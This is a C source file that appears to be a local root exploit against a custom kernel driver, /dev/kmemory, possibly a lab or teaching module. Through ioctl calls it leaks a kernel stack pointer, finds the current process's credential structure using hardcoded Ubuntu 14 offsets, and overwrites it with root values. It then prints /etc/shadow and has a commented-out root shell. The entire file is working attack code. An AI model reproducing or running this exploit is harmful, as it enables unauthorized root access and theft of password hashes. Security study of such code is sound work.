#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#include "kmem_ioctl.h"

#define UBUNTU14_32 1
#define UBUNTU14_64 2

#ifndef SYSTEM
# define SYSTEM UBUNTU14_32
#endif

#if SYSTEM == UBUNTU14_32
# define THREAD_SIZE 0x2000
# define TASK_CRED_OFFSET 1020
#elif SYSTEM == UBUNTU16_64
# define THREAD_SIZE 0x4000
# define TASK_CRED_OFFSET 2632
#endif

static void fatal(char *msg)
{
        fprintf(stderr, "%s\n", msg);
        exit(1);
}

int cat(const char *fname)
{
	char buffer[4096];
	ssize_t nbytes;
	int ifd = open(fname, O_RDONLY);

	if (ifd < 0) {
		fprintf(stderr, "Can't open file %s\n", fname);
		perror("Error: ");
		return -1;
	}

	while ((nbytes = read(ifd, buffer, sizeof(buffer))) > 0) {
		if (write(1, buffer, nbytes) != nbytes)
			return -2;
	}

	return (nbytes < 0) ? -2 : 0;
}

int main(int argc, char *argv[])
{
	int fd, rc;

	fd = open("/dev/kmemory", O_RDONLY);
	if (fd < 0) {
		printf("Can't open /dev/kmemory\n");
		exit(1);
	}
	printf("open: fd %d\n", fd);

	struct kmem_ioctl *stack = malloc(sizeof(struct kmem_ioctl));
	stack->stack_ptr = NULL;
	rc = ioctl(fd, KMEM_IOCTL_STACK_PTR, stack);
	if (rc < 0)
                fatal(" [+] Failed to read stack pointer");
	printf("ioctl: stack ptr %p\n", stack->stack_ptr);

	void *current_thread_info = ((unsigned long)stack->stack_ptr & ~(THREAD_SIZE - 1));
	printf("current_thread_info ptr %p\n", current_thread_info);
	void *current;
	struct kmem_ioctl mem = { .rw_ulong = { .buf = &current, .ppos = current_thread_info } };
	rc = ioctl(fd, KMEM_IOCTL_READ_ULONG, &mem);
	printf("current ptr %p\n", current);
	void *cred_field = current + TASK_CRED_OFFSET;
	printf("cred field ptr %p\n", cred_field);

	void *cred = NULL;
	mem.rw_ulong.buf  = &cred;
	mem.rw_ulong.ppos = cred_field;
	rc = ioctl(fd, KMEM_IOCTL_READ_ULONG, &mem);
	printf("cred %p\n", cred);

	unsigned char root_creds[] = {
		0xff, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0x3f, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0x3f, 0x00, 0x00, 0x00,
		0xff, 0xff, 0xff, 0xff, 0x3f, 0x00, 0x00, 0x00
	};
	struct kmem_ioctl current_cred = { .rw = { .buf = root_creds, .count = sizeof(root_creds), .ppos = cred } };
	rc = ioctl(fd, KMEM_IOCTL_WRITE, &current_cred);

        if (getuid() == 0) {
                printf(" [+] Got root!\n");
        } else {
                fatal(" [+] Failed to get root :(");
        }

        setresuid(0, 0, 0);
	cat("/etc/shadow");
        //execl("/bin/sh", "/bin/sh", "−i", NULL);
}
